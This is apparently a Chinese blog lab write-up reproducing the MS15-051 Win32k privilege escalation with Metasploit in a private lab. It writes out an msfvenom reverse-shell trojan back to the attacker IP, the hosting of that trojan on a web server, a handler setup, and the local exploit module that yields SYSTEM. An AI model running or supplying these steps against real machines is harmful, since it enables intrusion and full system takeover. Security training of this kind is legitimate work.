---
title: ms15-051提权
date: 2021-08-19 00:03:38
updated: 2021-08-19 00:03:38
categories: 漏洞复现
password: npfs2333
---



windows内核溢出提权实战<!--more-->

# 漏洞背景
  Metasploit是一款开源的渗透测试工具，可以帮助安全员发现漏洞问题，此工具带有的攻击模块可以帮助安全员简单的利用相关的漏洞，本实验通过Metasploit对内网机器进行渗透，并且使用ms15-051进行权限提升获取window server 2003的system权限，最后进行远程控制。

Win32k.sys内核模式驱动程序没有正确处理内存对象，在实现上存在权限提升漏洞，成功利用此漏洞可使攻击者在内核模式中运行任意代码。攻击者必须具有有效的登录凭证，并且可以本地登录以利用此漏洞。远程或匿名用户无法利用此漏洞。
**相应补丁号为：3045171**

# 影响范围
```
Microsoft Windows Vista
Microsoft Windows Server 2012 R2
Microsoft Windows Server 2012
Microsoft Windows Server 2008 R2
Microsoft Windows Server 2008
Microsoft Windows Server 2003
Microsoft Windows RT 8.1
Microsoft Windows RT
Microsoft Windows 8.1
Microsoft Windows 8
Microsoft Windows 7
```

# 环境

| 机器   | 系统                     | IP             |
| ------ | ------------------------ | -------------- |
| 攻击机 | Kali 2021.2              | 192.168.45.135 |
| 靶机   | Windows Server 2008 32位 | 192.168.45.138 |
# 漏洞复现
假设已经获得一个低权限用户的msf
通过信息收集，查看一下是否安装了3045171，用wmic qfe |find "3045171"指定搜索补丁，该靶机并没有安装相应补丁


## 生成木马

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.45.135 lport=4444 -f exe > shell.exe
```

msfvenom命令：

```
-p, --payload <payload> 指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定
-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled <length> 为payload预先指定一个NOP滑动长度
-f, --format <format> 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder [encoder] 指定需要使用的encoder（编码器）
-a, --arch <architecture> 指定payload的目标架构
--platform <platform> 指定payload的目标平台
-s, --space <length> 设定有效攻击荷载的最大长度
-b, --bad-chars <list> 设定规避字符集，比如: &#039;\x00\xff&#039;
-i, --iterations <count> 指定payload的编码次数
-c, --add-code <path> 指定一个附加的win32 shellcode文件
-x, --template <path> 指定一个自定义的可执行文件作为模板
-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
--payload-options 列举payload的标准选项
-o, --out <path> 保存payload
-v, --var-name <name> 指定一个自定义的变量，以确定输出格式
--shellest 最小化生成payload
-h, --help 查看帮助选项
--help-formats 查看msf支持的输出格式列表
生成payload必须要使用“-p”来指定要使用的payload，“-f”来指定输出的格式，命令如：Msfvenom -p windows/meterpreter/bind

```


![图片描述](https://static.cdnjs.cloud/20210814/image-1628909960780_273851119949.png)


## 将木马上传至服务器
```
cd /opt/lampp/htdocs
mkdir shell
mv /root/shell.exe /opt/lampp/htdocs/shell/
/opt/lampp/lampp restart
```

![图片描述](https://static.cdnjs.cloud/20210814/image-1628910319431_68696100337.png)

访问192.168.45.135/shell即可下载木马。
![图片描述](https://static.cdnjs.cloud/20210814/image-1628910477859_681125504783.png)

##  开始攻击
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.45.135
set lport 4444
exploit
```

![图片描述](https://static.cdnjs.cloud/20210814/image-1628910546292_545481314737.png)

## 利用漏洞提权
```
background
search ms15-051 #寻找MS15-051的利用模块
use exploit/windows/local/ms15_051_client_copy_image
set payload windows/meterpreter/reverse_tcp
set session 1
set lhost 192.168.45.135
set lport 4444
run
```

![图片描述](https://static.cdnjs.cloud/20210814/image-1628910601601_351707160008.png)

成功获得了system权限，提权成功。
# reference

https://blog.csdn.net/qq_45716477/article/details/118440406